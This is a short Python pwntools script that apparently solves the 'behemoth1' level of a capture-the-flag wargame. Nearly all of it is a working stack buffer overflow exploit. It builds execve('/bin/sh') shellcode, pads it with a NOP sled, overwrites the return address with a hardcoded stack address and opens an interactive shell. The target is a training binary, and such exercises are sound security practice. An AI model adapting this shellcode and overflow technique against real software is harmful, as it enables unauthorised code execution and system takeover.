#!/usr/bin/env python

from pwn import *

io = process("/behemoth/behemoth1")

shellcode = b''.join([b"\x68\x2f\x73\x68\x00", # should be x68 instead of CC
                    b"\x68\x2f\x62\x69\x6e",
                    b"\x89\xe3",
                    b"\x31\xc9",
                    b"\x31\xd2",
                    b"\xb8\x0b\x00\x00\x00",
                    b"\xcd\x80"])

debug_shellcode = b"\xCC"*4

#shellcode = debug_shellcode

buffer_len = 0x43
NOP = b'\x90'
padding = NOP*(buffer_len-len(shellcode))+shellcode
ebp = b"B"*4

stack_address = p32(0xffffd620+0x20)

exploit = padding + ebp + stack_address
# print exploit
io.recv(timeout=0.1)

io.sendline(exploit)
io.interactive()
